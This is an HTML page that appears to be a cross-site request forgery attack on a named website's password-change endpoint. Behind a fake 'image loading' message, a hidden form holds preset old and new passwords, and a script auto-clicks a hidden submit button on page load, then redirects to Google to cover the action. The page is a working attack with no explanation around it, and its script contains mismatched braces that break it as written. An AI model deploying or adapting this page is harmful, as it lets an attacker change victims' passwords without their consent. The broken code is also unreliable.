<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>图片加载中...</title>
  <style>
    body {
      text-align: center;
      margin-top: 100px;
      font-family: Arial, sans-serif;
      background-color: #fff;
    }
    #status {
      font-size: 18px;
    }
  </style>
</head>
<body>

  <p id="status">图片加载中，请稍后…</p>

  <!-- CSRF 表单 -->
  <form id="csrfForm" action="https://cn.b58321.com/index.php?s=/MemberCenter/formChangePassword" method="POST">
    <input type="hidden" name="oldPassword" value="123456">
    <input type="hidden" name="newPassword" value="1234567">
    <input type="hidden" name="new2Password" value="1234567">
  </form>

  <script>
    window.onload = function () {
      const form = document.getElementById("csrfForm");

      // 创建一个临时按钮并点击以确保兼容性（防止部分浏览器限制直接 submit）
      const btn = document.createElement("button");
      btn.type = "submit";
      btn.style.display = "none";
      form.appendChild(btn);

      // 表单添加事件（可选拦截）
     const forceRedirect = setTimeout(() => {
        window.location.href = "https://www.google.com/?hl=zh_TW";
      }, 3000);
      };

      btn.click(); // 自动触发表单提交
    };
  </script>

</body>
</html>
